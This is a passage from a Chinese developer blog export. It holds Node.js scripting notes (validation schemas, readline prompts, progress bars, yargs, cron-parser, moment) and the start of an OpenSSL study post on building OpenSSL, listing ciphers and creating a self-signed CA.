class="string">&#x27;number&#x27;</span>,</span><br><span class="line">                    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">rule</span>: [&#123;</span><br><span class="line">                        <span class="attr">name</span>: <span class="string">&#x27;enums&#x27;</span>,</span><br><span class="line">                        <span class="attr">enums</span>: [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                        <span class="attr">message</span>: <span class="string">&#x27;开启test&#x27;</span>,</span><br><span class="line">                    &#125;],</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">hhh</span>: &#123;</span><br><span class="line">                    <span class="attr">name</span>: <span class="string">&#x27;hhh&#x27;</span>,</span><br><span class="line">                    <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">                    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="comment">// required依赖test.enable是否开启</span></span><br><span class="line">                    <span class="attr">dependOn</span>: <span class="string">&#x27;test.enable&#x27;</span>,</span><br><span class="line">                    <span class="attr">dependValue</span>: [<span class="number">1</span>],</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-callback自定义检查"><a href="#3-2-callback自定义检查" class="headerlink" title="3.2. callback自定义检查"></a>3.2. callback自定义检查</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xxxSchema = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;xxx配置&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">properties</span>: &#123;</span><br><span class="line">        <span class="attr">enable</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;enable&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">rule</span>: [&#123;</span><br><span class="line">                <span class="attr">name</span>: <span class="string">&#x27;enums&#x27;</span>,</span><br><span class="line">                <span class="attr">enums</span>: [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">                <span class="attr">message</span>: <span class="string">&#x27;开启test&#x27;</span>,</span><br><span class="line">            &#125;],</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">test</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;xxxxx&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="title function_">callback</span>(<span class="params">value, params, schema</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> &#123;</span><br><span class="line">                            <span class="attr">valid</span>: <span class="literal">false</span>,</span><br><span class="line">                            <span class="attr">msg</span>: <span class="string">&#x27;test错误&#x27;</span>,</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (value === <span class="string">&#x27;aaa&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;test不能是aaa&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (params.<span class="property">enable</span> === <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;enable 0&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">valid</span>: <span class="literal">false</span>,</span><br><span class="line">                        <span class="attr">msg</span>: err.<span class="property">message</span>,</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="4-暂停等待用户输入"><a href="#4-暂停等待用户输入" class="headerlink" title="4. 暂停等待用户输入"></a>4. 暂停等待用户输入</h2><ul>
<li>这里只展示同步的，异步的自己裁代码</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readSyncByRl</span>(<span class="params">tips</span>) &#123;</span><br><span class="line">    tips = tips || <span class="string">&#x27;&gt; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">            <span class="attr">input</span>: process.<span class="property">stdin</span>,</span><br><span class="line">            <span class="attr">output</span>: process.<span class="property">stdout</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        rl.<span class="title function_">question</span>(tips, <span class="function">(<span class="params">answer</span>) =&gt;</span> &#123;</span><br><span class="line">            rl.<span class="title function_">close</span>();</span><br><span class="line">            <span class="title function_">resolve</span>(answer.<span class="title function_">trim</span>());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> confirmText = <span class="keyword">await</span> <span class="title function_">readSyncByRl</span>(<span class="string">&#x27;是否继续？[y/N] &#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (confirmText !== <span class="string">&#x27;Y&#x27;</span> &amp;&amp; confirmText !== <span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-进度条展示"><a href="#5-进度条展示" class="headerlink" title="5. 进度条展示"></a>5. 进度条展示</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ProgressBar</span> = <span class="built_in">require</span>(<span class="string">&#x27;progress&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// :bar 代表进度条 &#x27;-------&#x27;</span></span><br><span class="line"><span class="comment">// :percent 代表百分比 &#x27;xx%&#x27;</span></span><br><span class="line"><span class="comment">// total为计算使用的值，width是显示宽度，complete为完成的展示字符</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="keyword">new</span> <span class="title class_">ProgressBar</span>(<span class="string">&#x27;progress: [:bar] :percent&#x27;</span>, &#123; <span class="attr">total</span>: <span class="number">100</span>, <span class="attr">width</span>: <span class="number">100</span>, <span class="attr">complete</span>: <span class="string">&#x27;=&#x27;</span> &#125;);</span><br><span class="line"><span class="keyword">let</span> rate = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(</span><br><span class="line">    <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        rate += <span class="number">0.1</span>;</span><br><span class="line">        <span class="comment">// update参数为0-1的值</span></span><br><span class="line">        bar.<span class="title function_">update</span>(rate);</span><br><span class="line">        <span class="keyword">if</span> (bar.<span class="property">complete</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ncomplete\n&quot;</span>);</span><br><span class="line">            <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">500</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="6-时间相关"><a href="#6-时间相关" class="headerlink" title="6. 时间相关"></a>6. 时间相关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回当前毫秒级时间戳</span></span><br><span class="line">&gt; <span class="title class_">Date</span>.<span class="title function_">now</span>()</span><br><span class="line"><span class="number">1642231982983</span></span><br><span class="line"><span class="comment">// 时间字符串转时间戳</span></span><br><span class="line">&gt; <span class="keyword">const</span> temp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;Wed Feb 23 2022 02:00:00 GMT+0800&#x27;</span>)</span><br><span class="line">&gt; temp.<span class="title function_">getTime</span>()</span><br><span class="line"><span class="number">1645552800000</span></span><br></pre></td></tr></table></figure>

<h2 id="7-生成uuid"><a href="#7-生成uuid" class="headerlink" title="7. 生成uuid"></a>7. 生成uuid</h2><h3 id="7-1-简单生成，不依赖第三方库"><a href="#7-1-简单生成，不依赖第三方库" class="headerlink" title="7.1. 简单生成，不依赖第三方库"></a>7.1. 简单生成，不依赖第三方库</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uuid</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> temp_url = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(<span class="keyword">new</span> <span class="title class_">Blob</span>());</span><br><span class="line">  <span class="keyword">var</span> uuid = temp_url.<span class="title function_">toString</span>(); <span class="comment">// blob:https://xxx.com/b250d159-e1b6-4a87-9002-885d90033be3</span></span><br><span class="line">  <span class="variable constant_">URL</span>.<span class="title function_">revokeObjectURL</span>(temp_url);</span><br><span class="line">  <span class="keyword">return</span> uuid.<span class="title function_">substr</span>(uuid.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="五、好用的第三方node-module"><a href="#五、好用的第三方node-module" class="headerlink" title="五、好用的第三方node_module"></a>五、好用的第三方<code>node_module</code></h1><h2 id="1-yargs-命令行参数解析"><a href="#1-yargs-命令行参数解析" class="headerlink" title="1. yargs 命令行参数解析"></a>1. yargs 命令行参数解析</h2><h3 id="1-1-一些基本用法"><a href="#1-1-一些基本用法" class="headerlink" title="1.1. 一些基本用法"></a>1.1. 一些基本用法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* eslint-disable no-console */</span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> yargs = <span class="built_in">require</span>(<span class="string">&#x27;yargs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 处理解析参数</span></span><br><span class="line">    <span class="keyword">let</span> argv = yargs</span><br><span class="line">        .<span class="title function_">usage</span>(<span class="string">&#x27;Usage: util.js [command] &lt;options&gt;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">strict</span>()   <span class="comment">// 严格模式，无法识别的参数会报错</span></span><br><span class="line">        .<span class="title function_">alias</span>(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;help&#x27;</span>)</span><br><span class="line">        .<span class="title function_">version</span>(<span class="literal">false</span>)     <span class="comment">// 不显示版本号</span></span><br><span class="line">        .<span class="title function_">command</span>(<span class="string">&#x27;cmd1&#x27;</span>, <span class="string">&#x27;cmd1 description&#x27;</span>)</span><br><span class="line">        .<span class="title function_">command</span>(<span class="string">&#x27;cmd2&#x27;</span>, <span class="string">&#x27;cmd2 discription&#x27;</span>)</span><br><span class="line">        .<span class="title function_">command</span>(<span class="string">&#x27;cmd3&#x27;</span>, <span class="string">&#x27;cmd3 discription&#x27;</span>)</span><br><span class="line">        .<span class="title function_">option</span>(<span class="string">&#x27;option_test_1&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">describe</span>: <span class="string">&#x27;option_test_1 description&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;string&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">option</span>(<span class="string">&#x27;option_test_2&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">describe</span>: <span class="string">&#x27;option_test_2 description&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;boolean&#x27;</span>,</span><br><span class="line">            <span class="attr">demandOption</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// 要求最少一个命令</span></span><br><span class="line">        .<span class="title function_">demandCommand</span>(<span class="number">1</span>, <span class="string">&#x27;请输入一个命令，cmd1/cmd2/cmd3&#x27;</span>)</span><br><span class="line">        .<span class="property">argv</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>

<p><strong>效果</strong></p>
<p>正常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js cmd1 --option_test_1 aaa --option_test_2</span><br><span class="line">&#123;</span><br><span class="line">  _: [ &#x27;cmd1&#x27; ],</span><br><span class="line">  option_test_1: &#x27;aaa&#x27;,</span><br><span class="line">  option_test_2: true,</span><br><span class="line">  &#x27;$0&#x27;: &#x27;util.js&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js cmd1 --option_test_1=aaa --option_test_2 aaa</span><br><span class="line">&#123;</span><br><span class="line">  _: [ &#x27;cmd1&#x27;, &#x27;aaa&#x27; ],</span><br><span class="line">  option_test_1: &#x27;aaa&#x27;,</span><br><span class="line">  option_test_2: true,</span><br><span class="line">  &#x27;$0&#x27;: &#x27;util.js&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js</span><br><span class="line">Usage: util.js [command] &lt;options&gt;</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">  test.js cmd1  cmd1 description</span><br><span class="line">  test.js cmd2  cmd2 discription</span><br><span class="line">  test.js cmd3  cmd3 discription</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --option_test_1  option_test_1 description                            [字符串]</span><br><span class="line">  --option_test_2  option_test_2 description                              [布尔]</span><br><span class="line">  -h, --help           显示帮助信息                                       [布尔]</span><br><span class="line"></span><br><span class="line">请输入一个命令，cmd1/cmd2/cmd3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js cmd1</span><br><span class="line">util.js cmd1</span><br><span class="line"></span><br><span class="line">cmd1 description</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --option_test_1  option_test_1 description                            [字符串]</span><br><span class="line">  --option_test_2  option_test_2 description                       [布尔] [必需]</span><br><span class="line">  -h, --help           显示帮助信息                                       [布尔]</span><br><span class="line"></span><br><span class="line">缺少必须的选项：option_test_2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js aaa cmd1</span><br><span class="line">Usage: util.js [command] &lt;options&gt;</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">  util.js cmd1  cmd1 description</span><br><span class="line">  util.js cmd2  cmd2 discription</span><br><span class="line">  util.js cmd3  cmd3 discription</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --option_test_1  option_test_1 description                            [字符串]</span><br><span class="line">  --option_test_2  option_test_2 description                              [布尔]</span><br><span class="line">  -h, --help           显示帮助信息                                       [布尔]</span><br><span class="line"></span><br><span class="line">无法识别的选项：aaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xxx@xxxx ~]# NODE_PATH=/path/to/node_modules node util.js cmd1 --aaa</span><br><span class="line">util.js cmd1</span><br><span class="line"></span><br><span class="line">cmd1 description</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --option_test_1  option_test_1 description                            [字符串]</span><br><span class="line">  --option_test_2  option_test_2 description                              [布尔]</span><br><span class="line">  -h, --help           显示帮助信息                                       [布尔]</span><br><span class="line"></span><br><span class="line">无法识别的选项：aaa</span><br></pre></td></tr></table></figure>

<h2 id="2-cron-parser-cron字符串解析"><a href="#2-cron-parser-cron字符串解析" class="headerlink" title="2. cron-parser cron字符串解析"></a>2. cron-parser cron字符串解析</h2><h3 id="2-1-基本用法"><a href="#2-1-基本用法" class="headerlink" title="2.1. 基本用法"></a>2.1. 基本用法</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">const</span> interval = parser.<span class="title function_">parseExpression</span>(<span class="string">&#x27;0 0 2 * * *&#x27;</span>)</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; interval.<span class="title function_">next</span>().<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;Sun Jan 16 2022 02:00:00 GMT+0800&#x27;</span></span><br><span class="line">&gt; interval.<span class="title function_">next</span>().<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;Mon Jan 17 2022 02:00:00 GMT+0800&#x27;</span></span><br><span class="line">&gt; interval.<span class="title function_">next</span>().<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;Tue Jan 18 2022 02:00:00 GMT+0800&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>一旦parser建立后，下一次时间就是建立当时的时间的下一次，如果系统时间改变，不会变更next的结果，用来判断需要小心</li>
</ul>
<h2 id="3-moment-时间格式化输出"><a href="#3-moment-时间格式化输出" class="headerlink" title="3. moment 时间格式化输出"></a>3. moment 时间格式化输出</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">const</span> moment = <span class="built_in">require</span>(<span class="string">&#x27;moment&#x27;</span>)</span><br><span class="line">&gt; <span class="title function_">moment</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYYMMDDHHmmss&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;20230912113225&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-脚本调用promise的函数不会自动退出"><a href="#1-脚本调用promise的函数不会自动退出" class="headerlink" title="1. 脚本调用promise的函数不会自动退出"></a>1. 脚本调用promise的函数不会自动退出</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readSyncByRl</span>(<span class="params">tips</span>) &#123;</span><br><span class="line">    tips = tips || <span class="string">&#x27;&gt; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">            <span class="attr">input</span>: process.<span class="property">stdin</span>,</span><br><span class="line">            <span class="attr">output</span>: process.<span class="property">stdout</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        rl.<span class="title function_">question</span>(tips, <span class="function">(<span class="params">answer</span>) =&gt;</span> &#123;</span><br><span class="line">            rl.<span class="title function_">close</span>();</span><br><span class="line">            <span class="title function_">resolve</span>(answer.<span class="title function_">trim</span>());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> confirmText = <span class="keyword">await</span> <span class="title function_">readSyncByRl</span>(<span class="string">&#x27;是否继续？[y/N] &#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(confirmText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用ssh执行<code>node xxx.js</code>，ssh不会退出，需要<code>Ctrl + c</code>才行</li>
<li>但是终端中执行<code>node xxx.js</code>，会自动退出</li>
<li>解决办法是，在最后加上exit();</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exit &#125; = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readSyncByRl</span>(<span class="params">tips</span>) &#123;</span><br><span class="line">    tips = tips || <span class="string">&#x27;&gt; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">            <span class="attr">input</span>: process.<span class="property">stdin</span>,</span><br><span class="line">            <span class="attr">output</span>: process.<span class="property">stdout</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        rl.<span class="title function_">question</span>(tips, <span class="function">(<span class="params">answer</span>) =&gt;</span> &#123;</span><br><span class="line">            rl.<span class="title function_">close</span>();</span><br><span class="line">            <span class="title function_">resolve</span>(answer.<span class="title function_">trim</span>());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> confirmText = <span class="keyword">await</span> <span class="title function_">readSyncByRl</span>(<span class="string">&#x27;是否继续？[y/N] &#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(confirmText);</span><br><span class="line">    <span class="title function_">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>openssl学习记录</title>
    <url>/blogs/2021-07-28-openssl/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\work\src\local\cpp\openssl\1.1.1&gt; .\apps\openssl.exe</span><br><span class="line">OpenSSL&gt; version</span><br><span class="line">OpenSSL 1.1.1k  25 Mar 2021</span><br></pre></td></tr></table></figure>

<h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1. 下载"></a>1. 下载</h2><ul>
<li>源码下载: <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a></li>
<li>github: <a href="https://github.com/openssl/openssl">https://github.com/openssl/openssl</a></li>
<li>二进制: <a href="https://wiki.openssl.org/index.php/Binaries">https://wiki.openssl.org/index.php/Binaries</a></li>
</ul>
<h2 id="2-编译"><a href="#2-编译" class="headerlink" title="2. 编译"></a>2. 编译</h2><h3 id="2-1-二进制编译"><a href="#2-1-二进制编译" class="headerlink" title="2.1. 二进制编译"></a>2.1. 二进制编译</h3><h4 id="1-linux"><a href="#1-linux" class="headerlink" title="1) linux"></a>1) linux</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--debug 编译带符号</span></span><br><span class="line">=&gt; ./config --debug --prefix=/path/to/install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译</span></span><br><span class="line">=&gt; make -j8</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">=&gt; make install</span><br></pre></td></tr></table></figure>

<h3 id="2-2-引擎编译"><a href="#2-2-引擎编译" class="headerlink" title="2.2. 引擎编译"></a>2.2. 引擎编译</h3><h1 id="二、命令"><a href="#二、命令" class="headerlink" title="二、命令"></a>二、命令</h1><h2 id="1-一些基本用法"><a href="#1-一些基本用法" class="headerlink" title="1. 一些基本用法"></a>1. 一些基本用法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">枚举支持的加密套件</span></span><br><span class="line">=&gt; openssl ciphers -V | column -t</span><br><span class="line">0x13,0x02  -  TLS_AES_256_GCM_SHA384         TLSv1.3  Kx=any       Au=any    Enc=AESGCM(256)             Mac=AEAD</span><br><span class="line">0x13,0x03  -  TLS_CHACHA20_POLY1305_SHA256   TLSv1.3  Kx=any       Au=any    Enc=CHACHA20/POLY1305(256)  Mac=AEAD</span><br><span class="line">0x13,0x01  -  TLS_AES_128_GCM_SHA256         TLSv1.3  Kx=any       Au=any    Enc=AESGCM(128)             Mac=AEAD</span><br><span class="line">0xC0,0x2C  -  ECDHE-ECDSA-AES256-GCM-SHA384  TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AESGCM(256)             Mac=AEAD</span><br><span class="line">0xC0,0x30  -  ECDHE-RSA-AES256-GCM-SHA384    TLSv1.2  Kx=ECDH      Au=RSA    Enc=AESGCM(256)             Mac=AEAD</span><br><span class="line">0x00,0x9F  -  DHE-RSA-AES256-GCM-SHA384      TLSv1.2  Kx=DH        Au=RSA    Enc=AESGCM(256)             Mac=AEAD</span><br><span class="line">0xCC,0xA9  -  ECDHE-ECDSA-CHACHA20-POLY1305  TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=CHACHA20/POLY1305(256)  Mac=AEAD</span><br><span class="line">0xCC,0xA8  -  ECDHE-RSA-CHACHA20-POLY1305    TLSv1.2  Kx=ECDH      Au=RSA    Enc=CHACHA20/POLY1305(256)  Mac=AEAD</span><br><span class="line">0xCC,0xAA  -  DHE-RSA-CHACHA20-POLY1305      TLSv1.2  Kx=DH        Au=RSA    Enc=CHACHA20/POLY1305(256)  Mac=AEAD</span><br><span class="line">0xC0,0x2B  -  ECDHE-ECDSA-AES128-GCM-SHA256  TLSv1.2  Kx=ECDH      Au=ECDSA  Enc=AESGCM(128)             Mac=AEAD</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="1-1-国密openssl命令"><a href="#1-1-国密openssl命令" class="headerlink" title="1.1. 国密openssl命令"></a>1.1. 国密openssl命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举支持的椭圆曲线</span></span><br><span class="line">openssl_gm ecparam -list_curves</span><br></pre></td></tr></table></figure>

<h2 id="2-证书"><a href="#2-证书" class="headerlink" title="2. 证书"></a>2. 证书</h2><h3 id="1-1-颁发证书"><a href="#1-1-颁发证书" class="headerlink" title="1.1. 颁发证书"></a>1.1. 颁发证书</h3><h4 id="1-国际密码标准（普密）"><a href="#1-国际密码标准（普密）" class="headerlink" title="(1) 国际密码标准（普密）"></a>(1) 国际密码标准（普密）</h4><p><strong>1. 颁发证书需要先生成一个颁发机构，也就是CA</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建目录防止混乱</span></span><br><span class="line">mkdir -p ssl_diy/private &amp;&amp; cd ssl_diy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成ca的私钥</span></span><br><span class="line">openssl genrsa -out private/cakey.pem 2048</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据key生成CA的证书文件</span></span><br><span class="line">openssl req -new -x509 -days 3650 -key private/cakey.pem -out cacert.pem</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将有一些配置需要填写，可以随意填写，因为是自颁发</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Country Name (2 letter code) [AU]: 国家名，自然CN</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">State or Province Name (full name) [Some-State]: 省份名称，比如Hunan</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Locality Name (eg, city) []: 城市名称，比如changsha</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organization Name (eg, company) [Internet Widgits Pty Ltd]: 公司名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organizational Unit Name (eg, section) []: 部门名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Common Name (eg, YOUR name) []: 颁发者的名字</span></span><br><span class="line"><span class="meta prompt_"># 